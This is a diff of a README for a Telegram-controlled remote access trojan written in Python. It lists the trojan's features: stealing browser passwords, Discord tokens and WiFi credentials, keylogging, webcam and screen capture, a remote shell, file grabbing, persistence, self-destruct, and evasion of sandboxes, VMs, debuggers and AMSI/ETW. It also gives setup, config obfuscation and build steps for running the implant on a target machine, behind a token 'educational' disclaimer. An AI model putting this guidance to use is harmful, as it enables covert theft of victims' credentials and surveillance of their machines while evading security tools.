@@ -1,39 +1,43 @@
 # Telegram RAT
 
-Full-featured Remote Access Tool with Telegram C2.  
-Supports password stealing, Discord tokens, WiFi credentials, keylogger, clipboard monitoring, screenshots, webcam, remote shell, and persistence.
+Remote Access Tool with Telegram C2.
 
 ## Features
 
 - System information + geolocation
-- Screenshot
-- Webcam photo
-- Keylogger (on/off/dump)
-- Browser password stealer:
-  - Chrome
-  - Edge
-  - Brave
-  - Opera / Opera GX
-  - Vivaldi
-  - Yandex
+- Screenshot / Webcam
+- Keylogger (ON/OFF/Dump)
+- Browser passwords (Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Yandex) with App-Bound Encryption support
 - Discord tokens
 - WiFi passwords
 - Clipboard monitor
-- File grabber (documents, wallets, keys, RDP, etc.)
+- File grabber
 - Remote shell
 - File download / upload
-- MessageBox popup
-- Persistence (Registry Run + Startup folder)
+- MessageBox
+- Persistence (Registry Run + Startup)
 - Self-destruct
+- Anti-analysis (sandbox, VM, debugger, AMSI/ETW)
+
+## Structure
+
+```
+rat.py              # entry point
+modules/
+  config.py         # obfuscated config
+  state.py          # runtime state
+  anti.py           # anti-analysis
+  stealers.py       # passwords, discord, wifi, files
+  system.py         # keylogger, clipboard, persist, screenshot, cam
+  main.py           # bot handlers
+```
 
 ## Requirements
 
 - Windows 10/11
 - Python 3.10+
-- Telegram Bot Token
-- Admin user ID (numeric)
 
-## Install dependencies
+## Install
 
 ```bash
 pip install pyTelegramBotAPI pynput mss opencv-python requests psutil pywin32 pycryptodome
@@ -41,25 +45,19 @@ pip install nuitka ordered-set zstandard
 ```
 
 ## Setup
-1. Create a bot via @BotFather and get the token.
+
+1. Create bot via @BotFather, get token.
 2. Get your numeric ID via @userinfobot.
-3. Edit encrypt.py and insert your values:
-```bash
+3. Edit `encrypt.py`:
+```python
 TOKEN = "123456:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 ADMIN = "987654321"
 ```
-4. Run the encryptor:
+4. Run:
 ```bash
 python encrypt.py
 ```
-5. Copy the output and paste it into rat.py replacing:
-```bash
-_TOKEN   = "PASTE_HERE"
-_ADMIN   = "PASTE_HERE"
-_API     = "PASTE_HERE"
-_LOGIN   = "PASTE_HERE"
-_DISCORD = "PASTE_HERE"
-```
+5. Paste the output into `modules/config.py` replacing the `PASTE_HERE` values.
 
 ## Build
 
@@ -80,54 +78,34 @@ nuitka ^
   --include-package=Crypto ^
   rat.py
 ```
-Output: rat.exe
 
 ## Usage
-1. Run rat.exe on the target machine.
-2. You will receive an "online" message in Telegram with the capability list and control keyboard.
-3. Use the buttons to control the implant.
+
+Run the binary. You will receive an "online" message with the control keyboard in Telegram.
 
 ## Commands
-Button,Action
 
-Info,System information
-
-Screen,Screenshot
-
-Cam,Webcam photo
-
-KL ON/OFF,Keylogger
-
-Dump KL,Dump keylogger buffer
-
-Passwords,Steal browser passwords
-
-Discord,Steal Discord tokens
-
-WiFi,Steal WiFi passwords
-
-Clip ON/OFF,Clipboard monitor
-
-Grab,Grab interesting files
-
-Shell,Execute remote command
-
-Download,Download file from target
-
-Upload,Upload file to target
-
-Msg,Show MessageBox
-
-Persist,Add to startup
-
-Kill,Self-destruct
+| Button | Action |
+|--------|--------|
+| Info | System information |
+| Screen | Screenshot |
+| Cam | Webcam photo |
+| KL ON/OFF | Keylogger |
+| Dump KL | Dump keylogger buffer |
+| Passwords | Steal browser passwords |
+| Discord | Steal Discord tokens |
+| WiFi | Steal WiFi passwords |
+| Clip ON/OFF | Clipboard monitor |
+| Grab | Grab interesting files |
+| Shell | Remote command |
+| Download | Download file |
+| Upload | Upload file |
+| Msg | MessageBox |
+| Persist | Add to startup |
+| Kill | Self-destruct |
 
 ## Notes
-- Chromium password stealing requires the user to be logged in (DPAPI).
-- Persistence works for the current user only.
-- Run as administrator for best results.
-- Replace icon.ico with any icon you want.
 
-## Disclaimer
-
-For educational and research purposes only.
+- Chromium passwords require the user to be logged in (DPAPI / ABE).
+- Persistence is user-level.
+- For educational and research purposes only.
